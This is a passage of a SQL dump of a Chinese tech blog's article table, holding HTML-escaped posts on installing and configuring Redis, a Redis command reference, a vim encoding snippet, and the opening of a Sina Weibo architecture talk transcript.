Finder&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/div&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386206517),
(8, 8, '&lt;p&gt;redis是一个key-value&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/51839.htm&quot;&gt;存储系统&lt;/a&gt;。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)和zset(有序集合)。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。&lt;br /&gt; &amp;nbsp; redis是一种非关系型数据存储工具，这区别于传统的关系型数据库(像mysql等)，类似于memcache，并且其内部集成了对list(链表)、set(集合)的操作，可以很方便快速的处理数据(像插入、删除list取交集 并集 差集等)，这极大的减轻了底层数据库的压力，并且给用户更快的响应速度。&lt;br /&gt; &amp;nbsp; 由于只是学习一下，没有应用在项目中，所以这里只是粗略的记一下自己在学习中感觉比较重要的东西，以及自己的一些心得。&lt;br /&gt;&lt;/p&gt;&lt;p&gt; &amp;nbsp; 看完了redis的定义，接下来我们安装redis &lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px;color:#009900&quot;&gt;&lt;strong&gt;windows系统redis安装&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;点此&lt;a href=&quot;https://github.com/ServiceStack/ServiceStack.Redis&quot; target=&quot;_blank&quot;&gt;windows版的redis下载&lt;/a&gt;&lt;/p&gt;在C:盘中新建了一个文件夹来存放redis，文件包里的各项文件介绍如下：&lt;br /&gt;&lt;span style=&quot;color:#ff00&quot;&gt;redis-server.exe 服务程序&lt;/span&gt;&lt;br style=&quot;color:#ff0000&quot; /&gt;&lt;span style=&quot;color:#ff00&quot;&gt; &amp;nbsp; redis.conf redis配置文件&lt;/span&gt;&lt;br style=&quot;color:#ff0000&quot; /&gt;&lt;span style=&quot;color:#ff00&quot;&gt; &amp;nbsp; redis-cli.exe 命令行客户端，测试用&lt;/span&gt;&lt;br style=&quot;color:#ff0000&quot; /&gt;&lt;span style=&quot;color:#ff00&quot;&gt; &amp;nbsp; redis-check-dump.exe 本地数据库检查&lt;/span&gt;&lt;br style=&quot;color:#ff0000&quot; /&gt;&lt;span style=&quot;color:#ff00&quot;&gt; &amp;nbsp; redis-check-aof.exe 更新日志检查&lt;/span&gt;&lt;br style=&quot;color:#ff0000&quot; /&gt;&lt;span style=&quot;color:#ff00&quot;&gt; &amp;nbsp; redis-benchmark.exe 性能测试，用以模拟同时由N个客户端发送M个 SETs/GETs 查询 (类似于 Apache的 ab 工具)&lt;/span&gt;&lt;br /&gt;&lt;p&gt;安装完成之后，打开&lt;span style=&quot;color:#ff00&quot;&gt;redis-server.exe&lt;/span&gt;启动redis服务，我们可以打开&lt;span style=&quot;color:#ff00&quot;&gt;redis-cli.exe&lt;span style=&quot;color:#000000&quot;&gt;输入指令来测试redis。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px;color:#009900&quot;&gt;&lt;strong&gt;linux系统redis安装&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;下载：&lt;a target=&quot;_blank&quot; href=&quot;http://redis.googlecode.com/files/redis-2.4.13.tar.gz&quot;&gt;http://redis.googlecode.com/files/redis-2.4.13.tar.gz&lt;/a&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;#tar zxvf redis-2.4.13.tar.gz \r\n#cd redis-2.4.13 \r\n#make &amp;amp;&amp;amp; make install \r\n#cp /usr/local/software/redis-2.4.13/redis.conf /usr/local/redis/redis.conf \r\n#ln -s /usr/local/bin/redis-server /sbin/redis \r\n#redis --config=/usr/local/redis/redis/conf&lt;/pre&gt;&lt;p&gt;redis.conf配置daemonize为yes，启动redis：&lt;/p&gt;&lt;p&gt;#redis /usr/local/redis/redis.conf&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px;color:#009900&quot;&gt;&lt;strong&gt;phpredis扩展安装&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;下载：&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/nicolasff/phpredis/downloads&quot;&gt;https://github.com/nicolasff/phpredis/downloads&lt;/a&gt;&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;#tar zvxf nicolasff-phpredis-2.2.1-27-gf8f552e.tar.gz \r\n#cd nicolasff-phpredis-2.2.1-27-gf8f552e \r\n#phpize \r\n#./configure --with-php-config=/usr/local/php/bin/php-config \r\n#make \r\n#make install&lt;/pre&gt;&lt;p&gt;安装完成之后编辑php.ini文件，加入生成的redis.so扩展，重启php-fpm&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;redis.conf的详细配置参考以下注解&lt;br /&gt;&lt;/p&gt;------------------------------------------------------------------------------------------------------------------------------------------&lt;br /&gt;&lt;span style=&quot;color:#ff00&quot;&gt;redis.conf配置文件注解（&lt;/span&gt;&lt;a href=&quot;http://apps.hi.baidu.com/share/detail/20692204&quot; target=&quot;_blank&quot;&gt;原文地址&lt;/a&gt;&lt;span style=&quot;color:#ff00&quot;&gt;）：&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;daemonize&lt;/span&gt;是否以后台进程运行，默认为no&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;pidfile&lt;/span&gt;如以后台进程运行，则需指定一个pid，默认为/var/run/redis.pid&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;bind&lt;/span&gt;绑定主机IP，默认值为127.0.0.1（注释）&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;port&lt;/span&gt; 监听端口，默认为6379&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;timeout&lt;/span&gt;超时时间，默认为300（秒）&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;loglevel&lt;/span&gt;日志记录等级，有4个可选值，debug，verbose（默认值），notice，warning&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;logfile&lt;/span&gt;日志记录方式，默认值为stdout&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;databases&lt;/span&gt;可用数据库数，默认值为16，默认数据库为0&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;save&amp;lt;seconds&amp;gt;&amp;lt;changes&amp;gt;&lt;/span&gt;指出在多长时间内，有多少次更新操作，就将数据同步到数据文件。这个可以多个条件配合，比如默认配置文件中的设置，就设置了三个条件。&lt;br /&gt;save 900 1 &amp;nbsp;900秒（15分钟）内至少有1个key被改变&lt;br /&gt;save 300 10 &amp;nbsp;300秒（5分钟）内至少有300个key被改变&lt;br /&gt;save 60 10000 &amp;nbsp;60秒内至少有10000个key被改变&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;rdbcompression&lt;/span&gt;存储至本地数据库时是否压缩数据，默认为yes&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;dbfilename&lt;/span&gt;本地数据库文件名，默认值为dump.rdb&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;dir&lt;/span&gt; 本地数据库存放路径，默认值为./&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;slaveof&amp;lt;masterip&amp;gt;&amp;lt;masterport&amp;gt;&lt;/span&gt;当本机为从服务时，设置主服务的IP及端口（注释）&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;masterauth&amp;lt;master-password&amp;gt;&lt;/span&gt;当本机为从服务时，设置主服务的连接密码（注释）&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;requirepass&lt;/span&gt;连接密码（注释）&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;maxclients&lt;/span&gt;最大客户端连接数，默认不限制（注释）&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;maxmemory&amp;lt;bytes&amp;gt;&lt;/span&gt;设置最大内存，达到最大内存设置后，Redis会先尝试清除已到期或即将到期的Key，当此方法处理后，任到达最大内存设置，将无法再进行写入操作。（注释）&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;appendonly&lt;/span&gt;是否在每次更新操作后进行日志记录，如果不开启，可能会在断电时导致一段时间内的数据丢失。因为redis本身同步数据文件是按上面save条件来同步的，所以有的数据会在一段时间内只存在于内存中。默认值为no&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;appendfilename&lt;/span&gt;更新日志文件名，默认值为appendonly.aof（注释）&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;appendfsync&lt;/span&gt;更新日志条件，共有3个可选值。no表示等操作系统进行数据缓存同步到磁盘，always表示每次更新操作后手动调用fsync()将数据写到磁盘，everysec表示每秒同步一次（默认值）。&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;vm-enabled&lt;/span&gt;是否使用虚拟内存，默认值为no&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;vm-swap-file&lt;/span&gt;虚拟内存文件路径，默认值为/tmp/redis.swap，不可多个Redis实例共享&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;vm-max-memory&lt;/span&gt;将所有大于vm-max-memory的数据存入虚拟内存,无论vm-max-memory设置多小,所有索引数据都是内存存储的(Redis的索引数据就是keys),也就是说,当vm-max-memory设置为0的时候,其实是所有value都存在于磁盘。默认值为0。&lt;br /&gt;&lt;br /&gt;----------------------------------------------------------------------------------------&lt;br /&gt;&lt;span style=&quot;color:#ff00&quot;&gt;benchmark工具测试信息：&lt;/span&gt;&lt;br /&gt;测试命令：&lt;br /&gt;redis-benchmark -n 100000 -c 60&lt;br /&gt;向redis服务器发送100000个请求，每个请求附带60个并发客户端&lt;br /&gt;结果（部分）：&lt;br /&gt;====== SET ======&lt;br /&gt;&lt;span style=&quot;color:#ff00&quot;&gt;对集合写入测试&lt;/span&gt;&lt;br /&gt; &amp;nbsp;100000 requests completed in 2.38 seconds&lt;br /&gt;&lt;span style=&quot;color:#ff00&quot;&gt;100000个请求在2.38秒内完成&lt;/span&gt;&lt;br /&gt; &amp;nbsp;60 parallel clients&lt;br /&gt;&lt;span style=&quot;color:#ff00&quot;&gt;每次请求有60个并发客户端&lt;/span&gt;&lt;br /&gt; &amp;nbsp;3 bytes payload&lt;br /&gt;&lt;span style=&quot;color:#ff00&quot;&gt;每次写入3个字节的数据&lt;/span&gt;&lt;br /&gt; &amp;nbsp;keep alive: 1&lt;br /&gt;&lt;span style=&quot;color:#ff00&quot;&gt;保持一个连接，一台服务器来处理这些请求&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;93.06% &amp;lt;= 15 milliseconds&lt;br /&gt;99.96% &amp;lt;= 31 milliseconds&lt;br /&gt;99.98% &amp;lt;= 46 milliseconds&lt;br /&gt;99.99% &amp;lt;= 62 milliseconds&lt;br /&gt;100.00% &amp;lt;= 62 milliseconds&lt;br /&gt;&lt;span style=&quot;color:#ff00&quot;&gt;所有请求在62毫秒内完成&lt;/span&gt;&lt;br /&gt;42105.26 requests per second&lt;br /&gt;&lt;span style=&quot;color:#ff00&quot;&gt;每秒处理42105.26次请求&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;从结果我们可以看到，redis数据库在很高并发的情况下也可以很快速的处理数据并作出响应&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386206807);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(9, 9, '&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#ff00&quot;&gt;redis命令列表&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;br /&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;连接控制&lt;br /&gt;&lt;/strong&gt;&lt;span style=&quot;color:#009900&quot;&gt;QUIT&lt;/span&gt; 关闭连接&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;AUTH&lt;/span&gt; (仅限启用时)简单的密码验证&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;适合全体类型的命令&lt;/strong&gt;&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;EXISTS&lt;/span&gt; &amp;nbsp; key判断一个键是否存在;存在返回 1;否则返回0;&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;DEL&lt;/span&gt; &amp;nbsp; key删除某个key,或是一系列key;DEL key1 key2 key3 key4&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;TYPE&lt;/span&gt; &amp;nbsp; key 返回某个key元素的数据类型( none:不存在,string:字符,list,set,zset,hash)&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;KEYS&lt;/span&gt; &amp;nbsp; pattern 返回匹配的key列表(KEYS foo*:查找foo开头的keys)&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;RANDOMKEY&lt;/span&gt; &amp;nbsp; 随机获得一个已经存在的key，如果当前数据库为空，则返回空字符串&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;RENAME&lt;/span&gt; &amp;nbsp; oldnamenewname更改key的名字，新键如果存在将被覆盖&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;RENAMENX &lt;/span&gt; &amp;nbsp;oldnamenewname 更改key的名字，如果名字存在则更改失败&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;DBSIZE&lt;/span&gt; &amp;nbsp; 返回当前数据库的key的总数&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;EXPIRE&lt;/span&gt; &amp;nbsp; 设置某个key的过期时间（秒）,(EXPIRE bruce1000：设置bruce这个key1000秒后系统自动删除)注意：如果在还没有过期的时候，对值进行了改变，那么那个值会被清除。&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;&lt;span style=&quot;color:#009900&quot;&gt;TTL&lt;/span&gt;&lt;/span&gt;查找某个key还有多长时间过期,返回时间秒&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;SELECT&lt;/span&gt; &amp;nbsp; &amp;nbsp;index选择数据库&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;MOVE&lt;/span&gt; &amp;nbsp; &amp;nbsp;key dbindex将指定键从当前数据库移到目标数据库 dbindex。成功返回1;否则返回0（源数据库不存在key或目标数据库已存在同名key）;&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;FLUSHDB&lt;/span&gt; &amp;nbsp; 清空当前数据库中的所有键&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;FLUSHALL&lt;/span&gt; &amp;nbsp; 清空所有数据库中的所有键&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;处理字符串的命令&lt;/strong&gt;&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;SET&lt;/span&gt; &amp;nbsp; key value给一个键设置字符串值。SET keyname datalength data (SET bruce 10paitoubing:保存key为burce,字符串长度为10的一个字符串paitoubing到数据库)，data最大不可超过1G。&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;GET&lt;/span&gt; &amp;nbsp; key获取某个key的value值。如key不存在，则返回字符串&ldquo;nil&rdquo;；如key的值不为字符串类型，则返回一个错误。&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;GETSET&lt;/span&gt; &amp;nbsp; keyvalue可以理解成获得的key的值然后SET这个值，更加方便的操作 (SET bruce 10paitoubing,这个时候需要修改bruce变成1234567890并获取这个以前的数据paitoubing,GETSETbruce 10 1234567890)&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;MGET &lt;/span&gt; &amp;nbsp;key1 key2 &hellip; keyN一次性返回多个键的值&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;SETNX &lt;/span&gt; &amp;nbsp;key valueSETNX与SET的区别是SET可以创建与更新key的value，而SETNX是如果key不存在，则创建key与value数据&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;MSET&lt;/span&gt; &amp;nbsp; key1 value1 key2value2 &hellip; keyN valueN 在一次原子操作下一次性设置多个键和值&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;MSETNX&lt;/span&gt; &amp;nbsp; key1 value1 key2value2 &hellip; keyN valueN在一次原子操作下一次性设置多个键和值（目标键不存在情况下，如果有一个以上的key已存在，则失败）&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;INCR&lt;/span&gt; &amp;nbsp; key 自增键值&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;INCRBY&lt;/span&gt; &amp;nbsp; key integer令键值自增指定数值&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;DECR&lt;/span&gt; &amp;nbsp; key 自减键值&lt;br /&gt;&lt;span style=&quot;color:#009900&quot;&gt;DECRBY&lt;/span&gt; &amp;nbsp; key integer令键值自减指定数值&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;处理 lists 的命令&lt;/strong&gt;&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;RPUSH&lt;/span&gt; key value 从 List尾部添加一个元素（如序列不存在，则先创建，如已存在同名Key而非序列，则返回错误）&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;LPUSH&lt;/span&gt; key value 从 List头部添加一个元素&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;LLEN&lt;/span&gt; key 返回一个 List的长度&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;LRANGE&lt;/span&gt; key startend从自定的范围内返回序列的元素 (LRANGE testlist 0 2;返回序列testlist前0 1 2元素)&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;LTRIM&lt;/span&gt; key startend修剪某个范围之外的数据 (LTRIM testlist 0 2;保留0 1 2元素，其余的删除)&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;LINDEX&lt;/span&gt; keyindex返回某个位置的序列值(LINDEX testlist 0;返回序列testlist位置为0的元素)&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;LSET&lt;/span&gt; key indexvalue更新某个位置元素的值&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;LREM&lt;/span&gt; key count value 从List的头部（count正数）或尾部（count负数）删除一定数量（count）匹配value的元素，返回删除的元素数量。&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;LPOP&lt;/span&gt; key 弹出 List的第一个元素&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;RPOP&lt;/span&gt; key 弹出 List的最后一个元素&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;RPOPLPUSH&lt;/span&gt; srckey dstkey弹出 _srckey_ 中最后一个元素并将其压入 _dstkey_头部，key不存在或序列为空则返回&ldquo;nil&rdquo;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;处理集合(sets)的命令（有索引无序序列）&lt;/strong&gt;&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SADD&lt;/span&gt; keymember增加元素到SETS序列,如果元素（membe）不存在则添加成功 1，否则失败 0;(SADD testlist 3 \none)&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SREM&lt;/span&gt; key member删除SETS序列的某个元素，如果元素不存在则失败0，否则成功 1(SREM testlist 3 N one)&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SPOP&lt;/span&gt; key从集合中随机弹出一个成员&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SMOVE&lt;/span&gt; srckey dstkeymember 把一个SETS序列的某个元素 移动到 另外一个SETS序列 (SMOVE testlist test 3\ntwo;从序列testlist移动元素two到 test中，testlist中将不存在two元素)&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SCARD&lt;/span&gt; key统计某个SETS的序列的元素数量&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SISMEMBER&lt;/span&gt; key member获知指定成员是否存在于集合中&lt;br /&gt;&lt;span style=&quot;color:#33ff33&quot;&gt;SINTER&lt;/span&gt; key1 key2 &hellip; keyN 返回 key1, key2, &hellip;, keyN 中的交集&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SINTERSTORE&lt;/span&gt; dstkey key1key2 &hellip; keyN 将 key1, key2, &hellip;, keyN 中的交集存入 dstkey&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SUNION&lt;/span&gt; key1 key2 &hellip; keyN返回 key1, key2, &hellip;, keyN 的并集&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SUNIONSTORE&lt;/span&gt; dstkey key1key2 &hellip; keyN 将 key1, key2, &hellip;, keyN 的并集存入 dstkey&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SDIFF&lt;/span&gt; key1 key2 &hellip; keyN依据 key2, &hellip;, keyN 求 key1 的差集。官方例子：&lt;br /&gt;key1 = x,a,b,c&lt;br /&gt;key2 = c&lt;br /&gt;key3 = a,d&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SDIFF&lt;/span&gt; key1,key2,key3=&amp;gt; x,b&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SDIFFSTORE&lt;/span&gt; dstkey key1key2 &hellip; keyN 依据 key2, &hellip;, keyN 求 key1 的差集并存入 dstkey&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SMEMBERS&lt;/span&gt; key返回某个序列的所有元素&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SRANDMEMBER&lt;/span&gt; key随机返回某个序列的元素&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;处理有序集合(sorted sets)的命令 (zsets)&lt;/strong&gt;&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;ZADD&lt;/span&gt; key score member添加指定成员到有序集合中，如果目标存在则更新score（分值，排序用）&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;ZREM&lt;/span&gt; key member从有序集合删除指定成员&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;ZINCRBY&lt;/span&gt; key incrementmember 如果成员存在则将其增加_increment_，否则将设置一个score为_increment_的成员&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;ZRANGE&lt;/span&gt; key start end返回升序排序后的指定范围的成员&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;ZREVRANGE&lt;/span&gt; key start end返回降序排序后的指定范围的成员&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;ZRANGEBYSCORE&lt;/span&gt; key minmax 返回所有符合score &amp;gt;= min和score &amp;lt;=max的成员 ZCARD key 返回有序集合的元素数量 ZSCORE key element 返回指定成员的SCORE值ZREMRANGEBYSCORE key min max 删除符合 score &amp;gt;= min 和score &amp;lt;= max 条件的所有成员&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;排序（List, Set, Sorted Set）&lt;/strong&gt;&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SORT&lt;/span&gt; key BY patternLIMIT start end GET pattern ASC|DESC ALPHA 按照指定模式排序集合或List&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#0800&quot;&gt;SORT mylist&lt;/span&gt;&lt;br /&gt;默认升序 ASC&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#0800&quot;&gt;SORT mylist DESC&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#0800&quot;&gt;SORT mylist LIMIT 010&lt;br /&gt;&lt;/span&gt;从序号0开始，取10条&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#0800&quot;&gt;SORT mylist LIMIT 0 10ALPHA DESC&lt;/span&gt;&lt;br /&gt;按首字符排序&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#0800&quot;&gt;SORT mylist BYweight_*&lt;br /&gt;SORT mylist BY weight_* GET object_*&lt;br /&gt;SORT mylist BY weight_* GET object_* GET #&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#0800&quot;&gt;SORT mylist BY weight_*STORE resultkey&lt;/span&gt;&lt;br /&gt;将返回的结果存放于resultkey序列（List）&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;持久控制&lt;/strong&gt;&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SAVE&lt;/span&gt; 同步保存数据到磁盘&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;BGSAVE&lt;/span&gt; 异步保存数据到磁盘&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;LASTSAVE&lt;/span&gt;返回上次成功保存到磁盘的Unix时间戳&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SHUTDOWN&lt;/span&gt; 同步保存到服务器并关闭Redis 服务器（SAVE+QUIT）&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;BGREWRITEAOF&lt;/span&gt;当日志文件过长时重写日志文件&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;远程控制命令&lt;/strong&gt;&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;INFO&lt;/span&gt;提供服务器的信息和统计信息&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;MONITOR&lt;/span&gt;实时输出所有收到的请求&lt;br /&gt;&lt;span style=&quot;color:#00ff&quot;&gt;SLAVEOF&lt;/span&gt; 修改复制选项&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;该命令列表引自&lt;a href=&quot;http://apps.hi.baidu.com/share/detail/20692204&quot; target=&quot;_blank&quot;&gt;http://apps.hi.baidu.com/share/detail/20692204&lt;/a&gt;&lt;br /&gt;PHP-redis中文说明:&lt;a href=&quot;http://blog.csdn.net/lgm252008/article/details/6748858&quot; target=&quot;_blank&quot;&gt;http://blog.csdn.net/lgm252008/article/details/6748858&lt;/a&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386206981),
(10, 10, '&lt;p&gt;&amp;quot;解决文件中文乱码&lt;br /&gt;set encoding=utf-8&lt;br /&gt;set fileencodings=utf-8,chinese,latin-1&lt;br /&gt;if has(&amp;quot;win32&amp;quot;)&lt;br /&gt; &amp;nbsp; set fileencoding=chinese&lt;br /&gt;else&lt;br /&gt; &amp;nbsp; set fileencoding=utf-8&lt;br /&gt;endif&lt;br /&gt;&lt;br /&gt;&amp;quot;解决菜单乱码&lt;br /&gt;source $VIMRUNTIME/delmenu.vim&lt;br /&gt;source $VIMRUNTIME/menu.vim&lt;br /&gt;&lt;br /&gt;&amp;quot;解决consle输出乱码&lt;br /&gt;language messages zh_CN.utf-8&lt;/p&gt;', 1386207124),
(11, 11, '&lt;p&gt;中国首届微博开发者大会在北京举行，这是国内微博行业的首场技术盛宴。作为国内微博市场的绝对领军者，新浪微博将在此次大会上公布一系列针对开发者的扶持政策，以期与第三方开发者联手推动微博行业的整体发展。图为微博平台首席架构师杨卫华演讲。&lt;br /&gt;&lt;br /&gt;以下为演讲实录：&lt;br /&gt;&lt;br /&gt;大家下午好，在座的大部分都是技术开发者，技术开发者往往对微博这个产品非常关心。最晚的一次，是12点多收到一个邮件说想了解一下微博底层是怎么构架的。很多技术人员对微博的构架非常感兴趣，就是一个明星他有300万粉丝，这个技术怎么来实现？今天在这里跟大家分享一下微博的底层机构，让大家对微博的底层技术有更好的了解。另外不管是做客户端、1.0、2.0、论坛、博客都要考虑架构的问题，架构实际上是有一些共性的。今天我通过讲解微博里面的一些架构，分析一下架构里面哪些共性大家可以参考。&lt;br /&gt;&lt;br /&gt;首先给大家介绍一下微博架构发展的历程。新浪微博在短短一年时间内从零发展到五千万用户，我们的基层架构也发展了几个版本。第一版就是是非常快的，我们可以非常快的实现我们的模块。我们看一下技术特点，微博这个产品从架构上来分析，它需要解决的是发表和订阅的问题。我们第一版采用的是推的消息模式，假如说我们一个明星用户他有10万个粉丝，那就是说用户发表一条微博的时候，我们把这个微博消息攒成10万份，这样就是很简单了，第一版的架构实际上就是这两行字。&lt;span 